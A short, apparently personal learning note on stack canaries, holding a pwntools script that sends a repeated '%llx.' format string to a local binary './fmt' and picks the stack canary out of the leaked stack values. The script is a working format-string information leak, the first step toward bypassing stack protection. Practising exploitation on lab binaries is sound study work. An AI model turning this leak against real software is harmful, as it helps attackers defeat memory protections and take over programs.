# Stack Canaries (HAVENT REALLY STARTED YET)

I have written a script to dynamically leak the stack canary of a binary with a format string vuln

There is nothing that is preventing you from finding the static offset between the input buffer and the stack canary

I just thought that doing it dynamically would be cooler. there really is no difference though, as long as the code does not change
the offset between input and stack canary will stay static no matter what stack protections are put in place
```py
#!/usr/bin/env python3
from pwn import *
import sys, time, os

context(arch="amd64", os="linux")
p = process("./fmt")
def leak_canary():
    check = []
    fmt = "%llx."*100
    p.sendline(fmt)

    data = p.recvall(timeout=1).split(b".")
    for i in range(3):
        for i in range(len(data)):
            if str(data[i][-2:].decode()) == "00":
                if len(data[i]) == 16:
                    check.append(i)
    try:
        ind = max(set(check), key=check.count)
        return int(data[ind], 16)
    except ValueError or NoneType:
        log.warning("Could not locate a Stack Canary!")

canary = leak_canary()
log.info("LEAKED STACK CANARY: %s" % hex(canary))
```
